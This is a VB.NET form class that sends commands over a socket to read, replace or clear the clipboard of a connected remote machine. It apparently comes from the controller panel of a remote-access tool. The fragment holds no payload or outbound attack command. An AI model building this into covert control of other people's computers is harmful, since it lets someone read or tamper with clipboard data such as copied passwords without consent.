Public Class FrmClipboard

    Public sk As MdClient

    Private Sub btnObterClipboard_Click(sender As Object, e As EventArgs) Handles btnObterClipboard.Click
        sk.Send(("MeuTextoClipboard" & MdSokserver.Y & MdFN.ENB("MeuTextoClipboard")))
    End Sub

    Private Sub btnCopiarClipboard_Click(sender As Object, e As EventArgs) Handles btnCopiarClipboard.Click
        Try
            Clipboard.SetText(txtGetClipboard.Text)
        Catch ex As Exception

        End Try
    End Sub

    Private Sub btnDefinirClipboard_Click(sender As Object, e As EventArgs) Handles btnDefinirClipboard.Click
        sk.Send(("NovoClipboard" & MdSokserver.Y & txtDefinirClipboard.Text))
    End Sub

    Private Sub btnExcluirClipboard_Click(sender As Object, e As EventArgs) Handles btnExcluirClipboard.Click
        sk.Send(("ExcluirClipboard" & MdSokserver.Y & "Excluir"))
    End Sub
End Class